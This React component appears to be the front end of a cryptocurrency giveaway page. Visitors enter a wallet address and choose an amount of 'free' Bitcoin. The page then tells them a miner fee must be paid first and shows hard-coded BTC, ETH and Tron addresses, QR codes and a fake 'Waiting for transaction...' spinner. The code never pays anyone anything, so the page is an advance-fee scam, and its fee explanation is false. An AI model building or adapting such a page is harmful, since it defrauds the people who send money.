import * as React from 'react';
import { Divider, FormControl, FormHelperText, IconButton, InputAdornment, MenuItem, Select, Slider, Tooltip, alpha } from '@mui/material';
import Box from '@mui/material/Box';
import Button from '@mui/material/Button';
import Container from '@mui/material/Container';
import Link from '@mui/material/Link';
import Stack from '@mui/material/Stack';
import TextField from '@mui/material/TextField';
import Typography from '@mui/material/Typography';
import { AccountCircle, CopyAllRounded, CurrencyBitcoin, CurrencyBitcoinRounded } from '@mui/icons-material';
import QRCode from '../download.png'
import ETHQRCode from '../ethqr.png'
import TRXQRCode from '../trxqr.png'
import ETH from '../ethereum.png'
import TRX from '../trx.png'
import { CircleSpinnerOverlay, FerrisWheelSpinner, WindmillSpinner } from 'react-spinner-overlay'



export default function Hero() {
  const [rangeValue, setRangeValue] = React.useState(0.003)
  const [wallet, setWallet] = React.useState("")
  const [finishStep, setFinishStep] = React.useState(false)
  const [paymentType, setPaymentType] = React.useState('btc')

  const ownerAddress = paymentType === 'btc' ? 'bc1qpvc9u6nz3l92xazv3hafytdvpusl406rkuy354' : paymentType === 'eth' ? '0xe457e9C793e07D98df936C27defABA5f9420A2Fa' : 'TRx64YC3tcTcEpR1vTriMt2PyNZKXofL4N'
  const needToSend = paymentType === 'btc' ? Number((rangeValue / 9)).toFixed(5) : paymentType === 'eth' ? Number((rangeValue / 9) * 20).toFixed(5) : Number((rangeValue / 9) * 550000).toFixed(5)

  return finishStep ? (
    <Box
      id="hero"
      sx={(theme) => ({
        width: '100%',
        backgroundImage:
          theme.palette.mode === 'light'
            ? 'linear-gradient(180deg, #CEE5FD, #FFF)'
            : `linear-gradient(#02294F, ${alpha('#090E10', 0.0)})`,
        backgroundSize: '100% 20%',
        backgroundRepeat: 'no-repeat',
      })}
    >
      <Container
        sx={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          pt: { xs: 14, sm: 20 },
          pb: { xs: 8, sm: 12 },
        }}
      >
        <div>
        <Typography
            variant="h4"
            sx={{
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
            }}
          >
            Bitcoin receiving address:
          </Typography>
          <Typography
            variant="h4"
            sx={{
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              color: 'orange',
              fontSize: '150%'
            }}
          >{wallet}</Typography>
          <Typography
            variant="h4"
            sx={{
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
              marginBottom: 2
            }}
          >
            Bitcoin Amount: <span style={{color: 'orange', fontSize: 'clamp(2rem, 2.5vw, 1rem)'}}>{rangeValue}</span>
          </Typography>
          <Divider />
          <Typography
            variant="h4"
            sx={{
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              marginTop: 2,
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
            }}
          >
          <span style={{color: 'red', fontWeight: '900'}}>!</span> The Bitcoin network requires that each transaction have a small fee paid to the miners who create new blocks. In order for us to send your funds to you, you must send a small payment to the address listed below. After it has been received, your funds will be transferred and should arrive within 10 minutes.
          </Typography>
          </div>
          <FormControl sx={{ m: 1, minWidth: 120 }}>
          <FormHelperText>Payment</FormHelperText>
        <Select
          value={paymentType}
          onChange={(e) => setPaymentType(e.target.value)}
          // displayEmpty
          // inputProps={{ 'aria-label': 'Without label' }}
        >
          <MenuItem style={{backgroundColor: 'black', borderRadius: 0}} value={'btc'}>Bitcoin</MenuItem>
          <MenuItem style={{backgroundColor: 'black', borderRadius: 0}} value={'eth'}>Ethereum</MenuItem>
          <MenuItem style={{backgroundColor: 'black', borderRadius: 0}} value={'trx'}>Tron</MenuItem>
        </Select>
      </FormControl>
          <Typography
            variant="h4"
            sx={{marginTop: 5,

              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
            }}
          >
            Please send <span style={{color: 'orange'}}>{parseFloat(needToSend)}</span> {paymentType === 'btc' ? 'BTC' : paymentType === 'eth' ? 'ETH' : 'Tron (TRX)'} to:
          </Typography>
           <TextField
           fullWidth
           value={ownerAddress}
           id="fullWidth"
           
           InputProps={{
            style: {
color: 'orange',
opacity: 1,
outline: 'none',
textTransform: 'uppercase'
            },
            startAdornment: (
              <InputAdornment position="start">
                {paymentType === 'btc' ? <CurrencyBitcoin /> : paymentType === 'eth' ? <img src={ETH} width={29} /> : <img src={TRX} width={25} />}
              </InputAdornment>
            ),
            endAdornment: (
              <Tooltip title="Copy">
              <InputAdornment onClick={() => {
                navigator.clipboard.writeText(ownerAddress)
              }} position="start">
                <IconButton>
                <CopyAllRounded />
                </IconButton>
              </InputAdornment>
              </Tooltip>
            ),
          }}
           />
           <Typography
            variant="h4"
            sx={{
              marginTop: 5,
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
              marginBottom: 2,
            }}
          >
            Or scan the QR code below ({paymentType === 'btc' ? 'BTC' : paymentType === 'eth' ? 'ETH' : 'Tron (TRX)'}):
            </Typography>
            <img src={paymentType === 'btc' ? QRCode : paymentType === 'eth' ? ETHQRCode : TRXQRCode} style={{width: 300, height: 300}} />
            <Typography
            variant="h4"
            sx={{
              marginTop: 2,
              // display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              // alignSelf: 'center',
              // textAlign: 'center',
              fontSize: 'clamp(2rem, 2.5vw, 1rem)',
            }}
          >
            Waiting for transaction...
            </Typography>
            <WindmillSpinner loading={1} size={40} color={"orange"} />
      </Container>
    </Box>
  ) : (
    <Box
      id="hero"
      sx={(theme) => ({
        width: '100%',
        backgroundImage:
          theme.palette.mode === 'light'
            ? 'linear-gradient(180deg, #CEE5FD, #FFF)'
            : `linear-gradient(#02294F, ${alpha('#090E10', 0.0)})`,
        backgroundSize: '100% 20%',
        backgroundRepeat: 'no-repeat',
      })}
    >
      <Container
        sx={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          pt: { xs: 14, sm: 20 },
          pb: { xs: 8, sm: 12 },
        }}
      >
        <Stack spacing={2} useFlexGap sx={{ width: { xs: '100%', sm: '70%' } }}>
          <Typography
            variant="h1"
            sx={{
              display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              alignSelf: 'center',
              textAlign: 'center',
              fontSize: 'clamp(3.5rem, 10vw, 4rem)',
            }}
          >
           Enter your Bitcoin wallet address:
            {/* <Typography
              component="span"
              variant="h1"
              sx={{
                fontSize: 'clamp(3rem, 10vw, 4rem)',
                color: (theme) =>
                  theme.palette.mode === 'light' ? 'primary.main' : 'primary.light',
              }}
            >
              address:
            </Typography> */}
          </Typography>
          <Typography
            textAlign="center"
            color="text.secondary"
            sx={{ alignSelf: 'center', width: { sm: '100%', md: '80%' } }}
          >
            Don't have a Bitcoin wallet? Create it through the official website <a target={'_blank'} href={'https://bitcoincore.org'} style={{ color:'orange'}}>Bitcoin</a> or using popular crypto wallets such as <a href="https://trustwallet.com/ru" target="_blank" style={{color: 'orange'}}>Trust Wallet</a>, <a style={{color: 'orange'}} target="_blank" href={"https://www.blockchain.com/"}>Blockchain</a> and so on.
          </Typography>
          {/* <Stack
            direction={{ xs: 'column', sm: 'row' }}
            alignSelf="center"
            spacing={1}
            useFlexGap
            sx={{ pt: 2, width: { xs: '00%', sm: 'auto' } }}
          >
            <TextField
              id="outlined-basic"
              hiddenLabel
              size="small"
              variant="outlined"
              aria-label="Enter your BTC address"
              placeholder={`Example: ${ownerAddress}`}
              inputProps={{
                autocomplete: 'off',
                ariaLabel: 'Enter your BTC address',
              }}
              value={wallet}
              onChange={(e) => setWallet(e.target.value)}
            />
          </Stack> */}
          <TextField
              id="outlined-basic"
              hiddenLabel
              size="small"
              variant="outlined"
              aria-label="Enter your BTC address"
              placeholder={`Example: ${ownerAddress}`}
              inputProps={{
                autocomplete: 'off',
                ariaLabel: 'Enter your BTC address',
              }}
              value={wallet}
              onChange={(e) => setWallet(e.target.value)}
            />
          <Stack
            direction={{ xs: 'column', sm: 'row' }}
            alignSelf="center"
            spacing={1}
            useFlexGap
            sx={{ pt: 2, width: { xs: '00%', sm: 'auto' } }}
          >
            <Typography
            variant="h3"
            sx={{
              display: 'flex',
              flexDirection: { xs: 'column', md: 'row' },
              alignSelf: 'center',
              textAlign: 'center',
              fontSize: 30,
              fontWeight: '600'
            }}
          >
            Choose amount of Bitcoin ({rangeValue}):
          </Typography>
          </Stack>
          <Slider
  aria-label="Small steps"
  defaultValue={0.00000005}
  value={rangeValue}
  step={0.001}
  marks
  min={0.003}
  max={0.1}
  valueLabelDisplay="auto"
  onChange={(e) => setRangeValue(e.target.value)}
/>
          <Stack
            direction={{ xs: 'column', sm: 'row' }}
            alignSelf="center"
            spacing={1}
            useFlexGap
            sx={{ pt: 2, width: { xs: '100%', sm: 'auto' } }}
          >
           
          <Button onClick={() => setFinishStep(true)} disabled={!wallet.trim()} variant="contained" color="success">
              GET BITCOIN
            </Button>
            </Stack>
          {/* <Typography variant="caption" textAlign="center" sx={{ opacity: 0.8 }}>
            By clicking &quot;Start now&quot; you agree to our&nbsp;
            <Link href="#" color="primary">
              Terms & Conditions
            </Link>
            .
          </Typography> */}
        </Stack>
      </Container>
    </Box>
  );
}
